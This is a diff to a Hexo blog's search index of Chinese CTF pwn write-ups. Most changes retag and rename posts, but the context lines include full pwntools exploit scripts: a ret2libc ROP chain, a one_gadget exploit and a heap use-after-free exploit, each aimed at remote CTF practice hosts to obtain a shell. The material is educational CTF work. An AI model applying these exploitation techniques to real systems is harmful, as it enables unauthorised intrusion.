@@ -18,9 +18,11 @@
 <p>多跑几次就能出flag</p>
 ]]></content>
       <categories>
-        <category>Stack</category>
-        <category>EIP</category>
+        <category>WriteUp</category>
       </categories>
+      <tags>
+        <tag>EIP</tag>
+      </tags>
   </entry>
   <entry>
     <title>NepCTF</title>
@@ -58,7 +60,7 @@
   </entry>
   <entry>
     <title>CTFShow_0x1</title>
-    <url>/2021/03/30/Pwn_CTFShow_01/</url>
+    <url>/2021/03/30/CTFShow_0x1/</url>
     <content><![CDATA[<h1 id="Pwn-CTFShow"><a href="#Pwn-CTFShow" class="headerlink" title="Pwn_CTFShow"></a>Pwn_CTFShow</h1><span id="more"></span>
 <h2 id="1-PWN签到题"><a href="#1-PWN签到题" class="headerlink" title="1.PWN签到题"></a>1.PWN签到题</h2><p>直接 <code>nc</code></p>
 <p>出flag，白给</p>
@@ -175,12 +177,12 @@
 <p>1</p>
 ]]></content>
       <categories>
-        <category>ctfShow</category>
+        <category>比赛WriteUp</category>
       </categories>
   </entry>
   <entry>
     <title>HGame</title>
-    <url>/2021/03/30/Hgame/</url>
+    <url>/2021/03/30/HGame/</url>
     <content><![CDATA[<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><span id="more"></span>
 <h2 id="once-格式化字符串"><a href="#once-格式化字符串" class="headerlink" title="once(格式化字符串)"></a>once(格式化字符串)</h2><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210306191440.png" alt="20210306191440"></p>
 <p>IDA看，明显是格式化字符串漏洞，显然是⽤来 leak （泄露地址） 的了，泄露出 libc 的地址，就能计算出 onegadget 的地址了，最后覆盖返回地址，使得返回到 onegadget 就能拿到 shell</p>
@@ -229,7 +231,6 @@
 <p>之后就是简单的 rop 了</p>
 <p>exp：</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;zsh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;159.75.104.107&#x27;</span>,<span class="number">30372</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./rop_primary&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_matrix</span>():</span></span><br><span class="line">	matrix = []</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		line = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip()    </span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;\t&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> line:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		row = []</span><br><span class="line">		<span class="keyword">for</span> num <span class="keyword">in</span> line.split(<span class="string">&#x27;\t&#x27;</span>):</span><br><span class="line">			row.append(<span class="built_in">int</span>(num))</span><br><span class="line">		<span class="built_in">print</span>(line)</span><br><span class="line">        matrix.append(row)</span><br><span class="line">	<span class="keyword">return</span> matrix</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multi_matrix</span>(<span class="params">a, b</span>):</span></span><br><span class="line">	rows = <span class="built_in">len</span>(a)</span><br><span class="line">	mid = <span class="built_in">len</span>(b)</span><br><span class="line">	cols = <span class="built_in">len</span>(b[<span class="number">0</span>])</span><br><span class="line">	result = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">		row = []</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">			num = <span class="number">0</span></span><br><span class="line">			<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(mid):</span><br><span class="line">				num += a[i][k] * b[k][j]</span><br><span class="line">			row.append(num)</span><br><span class="line">		result.append(row)</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;A:\n&#x27;</span>)</span><br><span class="line">a = read_matrix()</span><br><span class="line">b = read_matrix()</span><br><span class="line"></span><br><span class="line">result = multi_matrix(a, b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> result:</span><br><span class="line">	<span class="keyword">for</span> num <span class="keyword">in</span> row:</span><br><span class="line">		p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./rop_primary&#x27;</span>)</span><br><span class="line">pus_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pus_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401613</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000401611</span></span><br><span class="line">vuln_addr = <span class="number">0x000000000040157B</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(pop_rdi) + p64(pus_got) + p64(pus_plt) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;try your best\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">offset = puts_addr -  	<span class="number">0x0875a0</span>    </span><br><span class="line">system_addr = offset + <span class="number">0x055410</span>   </span><br><span class="line">bin_sh = offset + 	<span class="number">0x1b75aa</span>        </span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(ret_addr) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 
 
 
@@ -384,8 +385,11 @@
 <p><a href="https://blog.csdn.net/github_36788573/article/details/103541178">参考链接</a></p>
 ]]></content>
       <categories>
-        <category>SROP</category>
+        <category>WriteUp</category>
       </categories>
+      <tags>
+        <tag>SROP</tag>
+      </tags>
   </entry>
   <entry>
     <title>checksec</title>
@@ -420,13 +424,16 @@
 
 <h2 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h2><p><a href="https://www.jianshu.com/p/31449fdfe35f">Checksec</a></p>
 ]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
       <tags>
         <tag>checksec</tag>
       </tags>
   </entry>
   <entry>
     <title>Hello World</title>
-    <url>/2021/03/28/hello-world/</url>
+    <url>/2021/03/28/Hello%20World/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! </p>
 <span id="more"></span>
 <p>This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -446,7 +453,7 @@
   </entry>
   <entry>
     <title>One_gadget</title>
-    <url>/2021/03/24/one_gadget/</url>
+    <url>/2021/03/24/One_gadget/</url>
     <content><![CDATA[<h1 id="One-gadget"><a href="#One-gadget" class="headerlink" title="One_gadget"></a>One_gadget</h1><span id="more"></span>
 <h2 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h2><p>ida看main函数</p>
 <p><img src="https://img-blog.csdnimg.cn/20201127174547573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再看init函数</p>
@@ -459,16 +466,18 @@
 <p>exp：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25812</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.29.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">printf_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0x106ef8</span></span><br><span class="line">payload = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Give me your one gadget:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-
 ]]></content>
       <categories>
-        <category>One_gadget</category>
+        <category>WriteUp</category>
       </categories>
+      <tags>
+        <tag>OneGadget</tag>
+      </tags>
   </entry>
   <entry>
     <title>_stack_chk_fail</title>
-    <url>/2021/03/24/stack_chk_fail_(cannay)/</url>
-    <content><![CDATA[<h1 id="stack-chk-fail"><a href="#stack-chk-fail" class="headerlink" title="_stack_chk_fail"></a>_stack_chk_fail</h1><span id="more"></span>
+    <url>/2021/03/24/stack_chk_fail/</url>
+    <content><![CDATA[<h1 id="stack-chk-fail"><a href="#stack-chk-fail" class="headerlink" title="stack_chk_fail"></a>stack_chk_fail</h1><span id="more"></span>
 <h4 id="BJDCTF-2nd"><a href="#BJDCTF-2nd" class="headerlink" title="BJDCTF_2nd"></a>BJDCTF_2nd</h4><h2 id="r2t4"><a href="#r2t4" class="headerlink" title="r2t4"></a>r2t4</h2><h4 id="格式化字符串-stack-chk-fail"><a href="#格式化字符串-stack-chk-fail" class="headerlink" title="格式化字符串 + _stack_chk_fail"></a>格式化字符串 + _stack_chk_fail</h4><p>看ida</p>
 <p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223180634.png" alt="20201223180634"></p>
 <p>checksec发现开启了canary</p>
@@ -512,13 +521,15 @@
 <p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223193256.png" alt="20201223193256"></p>
 ]]></content>
       <categories>
-        <category>Stack</category>
-        <category>_stack_chk_fail</category>
+        <category>WriteUp</category>
       </categories>
+      <tags>
+        <tag>Canary</tag>
+      </tags>
   </entry>
   <entry>
     <title>整形溢出</title>
-    <url>/2021/03/24/%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA/</url>
+    <url>/2021/03/24/Shaping%20overflow/</url>
     <content><![CDATA[<h1 id="整形溢出"><a href="#整形溢出" class="headerlink" title="整形溢出"></a>整形溢出</h1><span id="more"></span>
 <h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>来自buuctf</p>
 <p>先看ida</p>
@@ -544,13 +555,15 @@
 <p><a href="https://www.jianshu.com/p/757fe6d91669">参考1</a><br><a href="https://www.cnblogs.com/bhxdn/p/12572580.html">参考2</a></p>
 ]]></content>
       <categories>
-        <category>Stack</category>
-        <category>整形溢出</category>
+        <category>WriteUp</category>
       </categories>
+      <tags>
+        <tag>整形溢出</tag>
+      </tags>
   </entry>
   <entry>
     <title>栈迁移</title>
-    <url>/2021/03/24/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
+    <url>/2021/03/24/Stack%20migration/</url>
     <content><![CDATA[<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><span id="more"></span>
 
 <h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="_ciscn_2019_es_2"></a>_ciscn_2019_es_2</h1><p>第一步：是把一个与ebp有关的地址泄漏出来，可以通过栈的填充做到</p>
@@ -601,12 +614,15 @@
 
 ]]></content>
       <categories>
-        <category>栈迁移</category>
+        <category>WriteUp</category>
       </categories>
+      <tags>
+        <tag>栈迁移</tag>
+      </tags>
   </entry>
   <entry>
     <title>湖湘杯hxb_Pwn</title>
-    <url>/2021/03/30/%E6%B9%96%E6%B9%98%E6%9D%AFhxb_Pwn/</url>
+    <url>/2021/03/30/hxb_Pwn/</url>
     <content><![CDATA[<h1 id="湖湘杯hxb-pwn"><a href="#湖湘杯hxb-pwn" class="headerlink" title="湖湘杯hxb_pwn"></a>湖湘杯hxb_pwn</h1><span id="more"></span>
 <h2 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h2><h3 id="pwn-libc"><a href="#pwn-libc" class="headerlink" title="pwn_libc"></a>pwn_libc</h3><p>ida</p>
 <p><img src="https://img-blog.csdnimg.cn/20201108200522719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
@@ -640,7 +656,7 @@
   </entry>
   <entry>
     <title>湖湘杯hxb_Re</title>
-    <url>/2021/03/30/%E6%B9%96%E6%B9%98%E6%9D%AFhxb_Re/</url>
+    <url>/2021/03/30/hxb_Re/</url>
     <content><![CDATA[<h1 id="湖湘杯hxb-Re"><a href="#湖湘杯hxb-Re" class="headerlink" title="湖湘杯hxb_Re"></a>湖湘杯hxb_Re</h1><span id="more"></span>
 <h2 id="easy-c"><a href="#easy-c" class="headerlink" title="easy_c++"></a>easy_c++</h2><p><img src="https://img-blog.csdnimg.cn/2020111417004942.png#pic_center" alt="在这里插入图片描述"></p>
 <p>长度32</p>
@@ -740,7 +756,7 @@
 
 ]]></content>
       <categories>
-        <category>BUUCTF</category>
+        <category>WriteUp</category>
       </categories>
   </entry>
   <entry>
@@ -936,8 +952,11 @@
 
 ]]></content>
       <categories>
-        <category>Heap</category>
+        <category>WriteUp</category>
       </categories>
+      <tags>
+        <tag>Heap</tag>
+      </tags>
   </entry>
   <entry>
     <title>CISCN_2021</title>
@@ -1010,9 +1029,9 @@
 
 <p>最后 md5(1425353142350212150442315,32) = 8a04b4597ad08b83211d3adfa1f61431</p>
 ]]></content>
-      <tags>
-        <tag>比赛WriteUp</tag>
-      </tags>
+      <categories>
+        <category>比赛WriteUp</category>
+      </categories>
   </entry>
   <entry>
     <title>Canary</title>
@@ -1103,13 +1122,15 @@
 <p><img src="Canary/image-20210425115237976.png" alt="image-20210425115237976"></p>
 ]]></content>
       <categories>
-        <category>Stack</category>
-        <category>Canary</category>
+        <category>WriteUp</category>
       </categories>
+      <tags>
+        <tag>Canary</tag>
+      </tags>
   </entry>
   <entry>
     <title>C语言中常见漏洞点</title>
-    <url>/2021/05/11/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%82%B9/</url>
+    <url>/2021/05/11/C/</url>
     <content><![CDATA[<h1 id="记录常见漏洞点"><a href="#记录常见漏洞点" class="headerlink" title="记录常见漏洞点"></a>记录常见漏洞点</h1><span id="more"></span>
 
 <h1 id="C语言函数"><a href="#C语言函数" class="headerlink" title="C语言函数"></a>C语言函数</h1><h2 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h2><p>计算 ascii 字符串长度的函数</p>
@@ -1117,12 +1138,12 @@
 <h2 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h2><p>在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code>，能造成 NULL byte off-by-one </p>
 ]]></content>
       <categories>
-        <category>C语言</category>
+        <category>笔记</category>
       </categories>
   </entry>
   <entry>
-    <title>DASCTF</title>
-    <url>/2021/04/06/DASCTF/</url>
+    <title>DASCTF_2021_3</title>
+    <url>/2021/04/06/DASCTF_2021_3/</url>
     <content><![CDATA[<p>DASCTF 2021三月赛</p>
 <span id="more"></span>
 
@@ -1143,7 +1164,6 @@
 ]]></content>
       <categories>
         <category>比赛WriteUp</category>
-        <category>DASCTF</category>
       </categories>
   </entry>
   <entry>
@@ -1185,8 +1205,11 @@
 <h1 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h1><p>当 large bin 中只存在一个chunk，那么该 chunk 的两个 nextsize指针都会指向自己</p>
 ]]></content>
       <categories>
-        <category>Heap</category>
+        <category>WriteUp</category>
       </categories>
+      <tags>
+        <tag>Heap</tag>
+      </tags>
   </entry>
   <entry>
     <title>ISCC_2021</title>
@@ -1232,8 +1255,8 @@
       </categories>
   </entry>
   <entry>
-    <title>ciscn_2019</title>
-    <url>/2021/06/02/ciscn_2019/</url>
+    <title>CISCN_2019</title>
+    <url>/2021/06/02/CISCN_2019/</url>
     <content><![CDATA[<h1 id="ciscn-2019"><a href="#ciscn-2019" class="headerlink" title="ciscn_2019"></a>ciscn_2019</h1><span id="more"></span>
 
 <h1 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h1><p>保护</p>
@@ -1265,9 +1288,9 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_3&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26908</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,<span class="type">Type</span>,content,length=<span class="number">0</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Type &gt; &#x27;</span>,<span class="built_in">str</span>(<span class="type">Type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="type">Type</span> == <span class="number">2</span>:        </span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Length &gt; &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Value &gt; &#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Value &gt; &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;bbbb&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="string">&#x27;bash&#x27;</span>+p32(sys_addr),<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 ]]></content>
-      <tags>
-        <tag>比赛WriteUp</tag>
-      </tags>
+      <categories>
+        <category>比赛WriteUp</category>
+      </categories>
   </entry>
   <entry>
     <title>orw</title>
@@ -1346,8 +1369,11 @@
 
 ]]></content>
       <categories>
-        <category>orw</category>
+        <category>WriteUp</category>
       </categories>
+      <tags>
+        <tag>orw</tag>
+      </tags>
   </entry>
   <entry>
     <title>program</title>
@@ -1379,7 +1405,7 @@
 <p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一<br>个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
 ]]></content>
       <categories>
-        <category>prograji</category>
+        <category>program</category>
       </categories>
   </entry>
   <entry>
@@ -1421,13 +1447,15 @@
 <p>返回地址用 pop_edx_ecx_ebx ，需要把 read 函数中的参数 pop 出来。</p>
 ]]></content>
       <categories>
-        <category>Stack</category>
-        <category>systemcall</category>
+        <category>WriteUp</category>
       </categories>
+      <tags>
+        <tag>SystemCall</tag>
+      </tags>
   </entry>
   <entry>
     <title>Fmtstr</title>
-    <url>/2021/03/24/FmtStr/</url>
+    <url>/2021/03/24/Fmtstr/</url>
     <content><![CDATA[<h1 id="Fmtstr"><a href="#Fmtstr" class="headerlink" title="Fmtstr"></a>Fmtstr</h1><span id="more"></span>
 
 
@@ -1622,12 +1650,15 @@
 
 ]]></content>
       <categories>
-        <category>Fmtstr</category>
+        <category>WriteUp</category>
       </categories>
+      <tags>
+        <tag>FmtString</tag>
+      </tags>
   </entry>
   <entry>
     <title>汇编</title>
-    <url>/2021/07/11/%E6%B1%87%E7%BC%96/</url>
+    <url>/2021/07/11/assembly/</url>
     <content><![CDATA[<h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><span id="more"></span>
 
 <p><img src="%E6%B1%87%E7%BC%96/image-20210711150318837.png" alt="image-20210711150318837"></p>
@@ -1659,10 +1690,13 @@
 </ul>
 <p>64位程序中函数的前6个参数使用寄存器进行存储：rdi、rsi、rdx、rcx、r8、r9</p>
 ]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
   </entry>
   <entry>
     <title>Ubuntu20_zsh</title>
-    <url>/2021/07/24/Ubuntu20-zsh/</url>
+    <url>/2021/07/24/Ubuntu20_zsh/</url>
     <content><![CDATA[<h1 id="Ubuntu20下zsh、oh-my-zsh、插件和主题安装"><a href="#Ubuntu20下zsh、oh-my-zsh、插件和主题安装" class="headerlink" title="Ubuntu20下zsh、oh-my-zsh、插件和主题安装"></a>Ubuntu20下zsh、oh-my-zsh、插件和主题安装</h1><p>之前ubuntu16 18都没写过自己安装zsh的过程，借此次ubuntu20顺手写一下</p>
 <span id="more"></span>
 
@@ -1720,5 +1754,8 @@
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install fonts-powerline</span><br></pre></td></tr></table></figure></li>
 </ul>
 ]]></content>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
   </entry>
 </search>
